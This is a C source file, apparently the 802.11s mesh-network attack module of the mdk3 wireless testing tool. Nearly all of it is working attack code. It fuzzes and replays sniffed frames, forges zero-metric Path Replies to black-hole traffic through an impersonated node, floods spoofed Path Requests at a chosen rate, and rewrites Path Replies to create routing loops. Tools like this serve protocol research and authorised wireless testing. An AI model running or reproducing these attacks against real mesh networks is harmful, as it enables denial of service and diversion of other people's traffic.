#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>

#include "ieee80211s.h"
#include "../osdep.h"
#include "../packet.h"
#include "../helpers.h"
#include "../mac_addr.h"

#define IEEE80211S_MODE 's'
#define IEEE80211S_NAME "Attacks for IEEE 802.11s mesh networks"


struct packet action_frame_sniffer_pkt;
pthread_mutex_t sniff_packet_mutex = PTHREAD_MUTEX_INITIALIZER;
unsigned int incoming_action = 0;
unsigned int incoming_beacon = 0;
char blackhole_info[1024];
struct ether_addr info_src, info_dst;


struct ieee80211s_options {
  char *mesh_id;
  char attack_type;
  char fuzz_type;
  unsigned int speed;
  struct ether_addr *target;
};

void ieee80211s_shorthelp()
{
  printf("  Various attacks on link management and routing in mesh networks.\n");
  printf("  Flood neighbors and routes, create black holes and divert traffic!\n");
}

void ieee80211s_longhelp()
{
  printf( "  Various attacks on link management and routing in mesh networks.\n"
	  "  Flood neighbors and routes, create black holes and divert traffic!\n"
	  "      -f <type>\n"
	  "         Basic fuzzing tests. Picks up Action and Beacon frames from the air, modifies and replays them:\n"
	  "         The following modification types are implemented:\n"
	  "         1: Replay identical frame until new one arrives (duplicate flooding)\n"
	  "         2: Change Source and BSSID (possibly resulting in Neighbor Flooding)\n"
	  "         3: Cut packet short, leave 802.11 header intact (find buffer errors)\n"
	  "         4: Shotgun mode, randomly overwriting bytes after header (find bugs)\n"
	  "         5: Skript-kid's automated attack trying all of the above randomly :)\n"
	  "      -b <impersonated_meshpoint>\n"
	  "         Create a Blackhole, using the impersonated_meshpoint's MAC adress\n"
	  "         mdk3 will answer every incoming Route Request with a perfect route over the impersonated node.\n"
	  "      -p <impersonated_meshpoint>\n"
	  "         Path Request Flooding using the impersonated_meshpoint's adress\n"
	  "         Adjust the speed switch (-s) for maximum profit!\n"
	  "      -l\n"
	  "         Just create loops on every route found by modifying Path Replies\n"
	  "      -s <pps>\n"
	  "         Set speed in packets per second (Default: 100)\n"
	  "      -n <meshID>\n"
	  "         Target this mesh network\n");
}

void *ieee80211s_parse(int argc, char *argv[]) {
  int opt, i;
  struct ieee80211s_options *dopt = malloc(sizeof(struct ieee80211s_options));
  
  dopt->mesh_id = NULL;
  dopt->attack_type = 0x00;
  dopt->speed = 100;
  dopt->target = NULL;
  
  while ((opt = getopt(argc, argv, "n:f:s:b:p:l")) != -1) {
    switch (opt) {
      case 'f':
	if (dopt->attack_type) { printf("Duplicate Attack type: Fuzzing\n"); return NULL; }
	i = atoi(optarg);
	if ((i > 5) || (i < 1)) {
	  printf("Invalid Fuzzing type!\n"); return NULL;
	} else {
	  dopt->attack_type = 'f';
	  dopt->fuzz_type = (char) i;
	}
      break;
      case 'b':
	if (dopt->attack_type) { printf("Duplicate Attack type: Blackhole\n"); return NULL; }
	dopt->target = malloc(sizeof(struct ether_addr));
	*(dopt->target) = parse_mac(optarg);
	dopt->attack_type = 'b';
      break;
      case 'p':
	if (dopt->attack_type) { printf("Duplicate Attack type: PREQ Flooding\n"); return NULL; }
	dopt->target = malloc(sizeof(struct ether_addr));
	*(dopt->target) = parse_mac(optarg);
	dopt->attack_type = 'p';
      break;
      case 'l':
	if (dopt->attack_type) { printf("Duplicate Attack type: Loop Forming\n"); return NULL; }
	dopt->attack_type = 'l';
      break;
      case 's':
	dopt->speed = (unsigned int) atoi(optarg);
      break;
      case 'n':
	if (strlen(optarg) > 255) {
	  printf("ERROR: MeshID too long\n"); return NULL;
	} else if (strlen(optarg) > 32) {
	  printf("NOTE: Using Non-Standard MeshID with length > 32\n");
	}
	dopt->mesh_id = malloc(strlen(optarg) + 1); strcpy(dopt->mesh_id, optarg);
      break;
      default:
	ieee80211s_longhelp();
	printf("\n\nUnknown option %c\n", opt);
	return NULL;
    }
  }
  
  if (dopt->attack_type == 0x00) {
    ieee80211s_longhelp();
    printf("\n\nERROR: You must specify an attack type (ie. -f)!\n");
    return NULL;
  } 
  if ((dopt->mesh_id == NULL) && (dopt->attack_type == 'f')){
    ieee80211s_longhelp();
    printf("\n\nERROR: You must specify a Mesh ID for this attack!\n");
    return NULL;
  } 
  
  return (void *) dopt;
}

void ieee80211s_check(void *options) {
  options = options;
  //No checks yet.
}

int action_frame_sniffer_acceptpacket(struct packet sniffed) {
  pthread_mutex_lock(&sniff_packet_mutex);
  if (sniffed.len == action_frame_sniffer_pkt.len) {
    if (! memcmp(action_frame_sniffer_pkt.data, sniffed.data, sniffed.len)) {
      pthread_mutex_unlock(&sniff_packet_mutex);
      return -1;  //Sniffed own injected packet, drop
    }
  }
  action_frame_sniffer_pkt = sniffed;
  set_seqno(NULL, get_seqno(&sniffed));
  pthread_mutex_unlock(&sniff_packet_mutex);
  return 0;
}

void action_frame_sniffer_thread(void *target_id) {
  struct packet sniffed;
  struct ieee_hdr *hdr;
  struct action_fixed *act;
  char *meshid;
  
  while(1) {
    sniffed = osdep_read_packet();
    hdr = (struct ieee_hdr *) sniffed.data;
    if (hdr->type == IEEE80211_TYPE_ACTION) {
      act = (struct action_fixed *) (sniffed.data + sizeof(struct ieee_hdr));
      if (act->category == MESH_ACTION_CATEGORY) {
	if (action_frame_sniffer_acceptpacket(sniffed)) continue;
	incoming_action++;
      }
    } else if (hdr->type == IEEE80211_TYPE_BEACON) {
      meshid = get_meshid(&sniffed, NULL);
      if (meshid) {
	if (! strcmp(meshid, (char *) target_id)) {
	  if (action_frame_sniffer_acceptpacket(sniffed)) continue;
	  incoming_beacon++;
	}
	free(meshid);
      }
    }
  }
}

struct packet do_fuzzing(struct ieee80211s_options *dopt) {
  struct packet sniff;
  static pthread_t *sniffer = NULL;
  struct ieee_hdr *hdr;
  static struct ether_addr genmac;
  static unsigned int genmac_uses = 0;
  unsigned int curfuzz, i, j;
  
  if (! (genmac_uses % 10)) { //New MAC every 10 packets
    genmac = generate_mac(MAC_KIND_CLIENT);
    genmac_uses = 0;
  }
  genmac_uses++;
  
  if (sniffer == NULL) {
    sniffer = malloc(sizeof(pthread_t));
    action_frame_sniffer_pkt.len = 0;
    pthread_create(sniffer, NULL, (void *) action_frame_sniffer_thread, (void *) dopt->mesh_id);
  }
  
  pthread_mutex_lock(&sniff_packet_mutex);
  while(action_frame_sniffer_pkt.len == 0) {
    pthread_mutex_unlock(&sniff_packet_mutex);
    usleep(50000);
    pthread_mutex_lock(&sniff_packet_mutex);
  }
  sniff = action_frame_sniffer_pkt;
  pthread_mutex_unlock(&sniff_packet_mutex);
  
  if (dopt->fuzz_type == 5) {
    curfuzz = (random() % 4) + 1;
  } else {
    curfuzz = dopt->fuzz_type;
  }
  
  switch (curfuzz) {
    case 1:
      increase_seqno(&sniff);
      return sniff;
    break;
    case 2:
      hdr = (struct ieee_hdr *) sniff.data;
      hdr->addr2 = genmac; //Src
      hdr->addr3 = genmac; //BSSID
      return sniff;
    break;
    case 3:
      sniff.len = sizeof(struct ieee_hdr) + (random() % (sniff.len - sizeof(struct ieee_hdr)));
      return sniff;
    break;
    case 4:
      j = ((random() % sniff.len) / 4) + 1;
      for (i=0; i<j; i++)
        sniff.data[random() % sniff.len] = random();
      return sniff;
    break;
    default:
      printf("BUG! Unknown fuzzing type %c\n", dopt->fuzz_type);
  }
  
  sniff.len = 0;
  return sniff;
}

struct packet do_blackhole(struct ieee80211s_options *dopt) {
  struct packet sniff, inject;
  struct ieee_hdr *hdr;
  struct action_fixed *act, *actinj;
  struct mesh_preq *preq = NULL;
  struct mesh_prep *prep;
  struct ether_addr *src;
  
  while(1) {
    sniff = osdep_read_packet();
    hdr = (struct ieee_hdr *) sniff.data;
    if (hdr->type == IEEE80211_TYPE_ACTION) {
      act = (struct action_fixed *) (sniff.data + sizeof(struct ieee_hdr));
      if ((act->category == MESH_ACTION_CATEGORY) && (act->action_code == MESH_ACTION_PATHSEL) && (act->tag == MESH_TAG_PREQ)) {
	preq = (struct mesh_preq *) (sniff.data + sizeof(struct ieee_hdr) + sizeof(struct action_fixed));
	break;
      }
    }
  }
  
  MAC_COPY(info_dst, preq->target);
  MAC_COPY(info_src, preq->originator);
  snprintf(blackhole_info, 1024, "Hops %3d  TTL %3d  ID %3d  Metric %5d  SeqNo %d/%d",
	   preq->hop_count, preq->ttl, preq->discovery_id, preq->metric, preq->orig_seq, preq->target_seq);
  
  src = get_source(&sniff);
  create_ieee_hdr(&inject, IEEE80211_TYPE_ACTION, 'a', AUTH_DEFAULT_DURATION, *src, *(dopt->target), *(dopt->target), *src, 0);
  actinj = (struct action_fixed *) (inject.data + sizeof(struct ieee_hdr));
  inject.len += sizeof(struct action_fixed);
  actinj->category = MESH_ACTION_CATEGORY;
  actinj->action_code = MESH_ACTION_PATHSEL;
  actinj->tag = MESH_TAG_PREP;
  actinj->taglen = 31;
  
  prep = (struct mesh_prep *) (inject.data + sizeof(struct ieee_hdr) + sizeof(struct action_fixed));
  inject.len += sizeof(struct mesh_prep);
  prep->flags = 0x00;
  prep->hop_count = 0;
  prep->ttl = 255;
  prep->target = preq->originator;
  prep->target_seq = preq->orig_seq;
  prep->lifetime = preq->lifetime;
  prep->metric = 0; /*ARRRRR!*/
  prep->originator = preq->target;
  prep->orig_seq = preq->target_seq + 10;
  
  return inject;
}

struct packet do_flood(struct ieee80211s_options *dopt) {
  struct packet inject;
  struct action_fixed *act;
  struct mesh_preq *preq;
  struct ether_addr bcast;
  static uint32_t id = 0;
  static uint32_t seq = 0;
  uint8_t hops;
  uint32_t tseq;
  
  MAC_SET_BCAST(bcast);
  
  create_ieee_hdr(&inject, IEEE80211_TYPE_ACTION, 'a', AUTH_DEFAULT_DURATION, bcast, *(dopt->target), *(dopt->target), bcast, 0);

  act = (struct action_fixed *) (inject.data + sizeof(struct ieee_hdr));
  inject.len += sizeof(struct action_fixed);
  act->category = MESH_ACTION_CATEGORY;
  act->action_code = MESH_ACTION_PATHSEL;
  act->tag = MESH_TAG_PREQ;
  act->taglen = 37;
  
  //Setting up values
  hops = (random() % 10) + 1; //Plus one so it looks like we just forwarded it ;)
  id++;
  seq += (random() % 10); //Randomly increasing sequence counter
  tseq = seq + ((random() % 50) - 25); //Setting target seq somewhere near orig seq
  
  preq = (struct mesh_preq *) (inject.data + sizeof(struct ieee_hdr) + sizeof(struct action_fixed));
  inject.len += sizeof(struct mesh_preq);
  preq->flags = 0x00;
  preq->hop_count = hops;
  preq->ttl = 31 - hops;
  preq->discovery_id = id;
  preq->originator = generate_mac(MAC_KIND_CLIENT);
  preq->orig_seq = seq;
  preq->lifetime = 4882; //default?
  preq->metric = random() % 4096;
  preq->target_count = 1; //thats enough for now ;)
  preq->target_flags = 0x02; //wireshark said so
  preq->target = generate_mac(MAC_KIND_CLIENT);
  preq->target_seq = tseq;
  
  return inject;
}

struct packet create_loop(struct ieee80211s_options *dopt) {
  dopt = dopt; //We dont care about options yet
  struct packet sniff;
  struct ieee_hdr *hdr;
  struct action_fixed *act;
  struct mesh_prep *prep;
  
  while(1) {
    sniff = osdep_read_packet();
    hdr = (struct ieee_hdr *) sniff.data;
    if (hdr->type == IEEE80211_TYPE_ACTION) {
      act = (struct action_fixed *) (sniff.data + sizeof(struct ieee_hdr));
      if ((act->category == MESH_ACTION_CATEGORY) && (act->action_code == MESH_ACTION_PATHSEL) && (act->tag == MESH_TAG_PREP)) {
	prep = (struct mesh_prep *) (sniff.data + sizeof(struct ieee_hdr) + sizeof(struct action_fixed));
	if (prep->metric == 1) continue; //skip injected packets
	if (prep->hop_count == 0) continue; //cannot create loop at target with itself!
	break;
      }
    }
  }

  //Swap Adresses to point packet back the initial route
  hdr->addr3 = hdr->addr1; //dst to bssid
  hdr->addr1 = hdr->addr2; //src to dst
  hdr->addr2 = hdr->addr3; //bssid to src
  
  MAC_COPY(info_dst, prep->target);
  MAC_COPY(info_src, prep->originator);
  
  //Fix values to make injected packet be newer and better than old route
  prep->hop_count = 1;
  prep->ttl = 30;
  prep->metric = 1;
  
  return sniff;
}

struct packet ieee80211s_getpacket(void *options) {
  struct ieee80211s_options *dopt = (struct ieee80211s_options *) options;
  struct packet pkt;
  
  sleep_till_next_packet(dopt->speed);
  
  switch (dopt->attack_type) {
    case 'f':
      pkt = do_fuzzing(dopt);
    break;
    case 'b':
      pkt = do_blackhole(dopt);
    break;
    case 'p':
      pkt = do_flood(dopt);
    break;
    case 'l':
      pkt = create_loop(dopt);
    break;
    default:
      printf("BUG! Unknown attack type %c\n", dopt->attack_type);
      pkt.len = 0;
  }

  return pkt;
}

void ieee80211s_stats(void *options) {
  struct ieee80211s_options *dopt = (struct ieee80211s_options *) options;
  
  switch (dopt->attack_type) {
    case 'f':
      printf("\rReceived Action frames: %5d  Received Mesh Beacons:  %5d                    \n", incoming_action, incoming_beacon);
    break;
    case 'b':
      printf("\rLast PREQ: ");
      print_mac(info_src);
      printf(" searching for ");
      print_mac(info_dst);
      printf(": %s\n", blackhole_info);
    break;
    case 'l':
      printf("\rLoops created on route between ");
      print_mac(info_src);
      printf(" and ");
      print_mac(info_dst);
      printf(".                      \n");
    break;
  }
}

struct attacks load_ieee80211s() {
  struct attacks this_attack;
  char *ieee80211s_name = malloc(strlen(IEEE80211S_NAME) + 1);
  strcpy(ieee80211s_name, IEEE80211S_NAME);

  this_attack.print_shorthelp = (fp) ieee80211s_shorthelp;
  this_attack.print_longhelp = (fp) ieee80211s_longhelp;
  this_attack.parse_options = (fpo) ieee80211s_parse;
  this_attack.mode_identifier = IEEE80211S_MODE;
  this_attack.attack_name = ieee80211s_name;
  this_attack.perform_check = (fps) ieee80211s_check;
  this_attack.get_packet = (fpp) ieee80211s_getpacket;
  this_attack.print_stats = (fps)ieee80211s_stats;
  
  return this_attack;
}
